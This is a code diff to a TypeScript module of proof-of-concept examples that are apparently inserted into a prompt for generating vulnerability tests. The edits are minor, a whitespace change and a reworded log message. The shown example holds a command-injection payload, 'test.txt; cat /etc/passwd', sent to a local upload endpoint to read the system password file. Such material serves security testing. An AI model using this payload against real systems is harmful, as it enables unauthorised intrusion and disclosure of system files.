@@ -60,7 +60,7 @@ export const POC_EXAMPLES: PocExample[] = [
     categories: ['command-injection', 'rce', 'exec', 'shell', 'os-injection'],
     example: {
       language: 'python',
-      code: 'import requests\n\n# Inject shell metacharacter into filename parameter\npayload = {\'filename\': \'test.txt; cat /etc/passwd\'}\nresponse = requests.post(\'http://localhost:5000/upload\', json=payload)\nprint(\'Response:\', response.text)\n\nif \'root:x:0:0\' in response.text:\n    print(\'TEST PASSED: /etc/passwd contents returned\')\nelse:\n    print(\'Payload did not execute — check endpoint and parameter name\')',
+      code: 'import requests\n\n# Inject shell metacharacter into filename parameter\npayload = {\'filename\': \'test.txt; cat /etc/passwd\'}\nresponse = requests.post(\'http://localhost:5000/upload\', json=payload)\nprint(\'Response:\', response.text)\n\nif \'root:x:0:0\' in response.text:\n    print(\'TEST PASSED: /etc/passwd contents returned\')\nelse:\n    print(\'Payload did not execute — check endpoint and parameter name\')  ',
       setupInstructions: '1. pip install requests\n2. Ensure target app is running on port 5000\n3. python3 poc.py',
       expectedImpact: '/etc/passwd contents appear in the response, confirming unsanitized shell execution of user-supplied filename',
       testSteps: [
@@ -129,7 +129,7 @@ export function selectPocExamples(vulnType: string, maxCount: number): PocExampl
     e.categories.some(c => normalised.includes(c) || c.includes(normalised))
   );
   if (matched.length === 0) {
-    console.warn(`[poc-examples] No examples matched vulnerability type "${vulnType}" — omitting examples from prompt`);
+    console.warn(`[poc-examples] No example match for vulnerability type "${vulnType}" — omitting examples from prompt`);
     return [];
   }
   return matched.slice(0, maxCount);
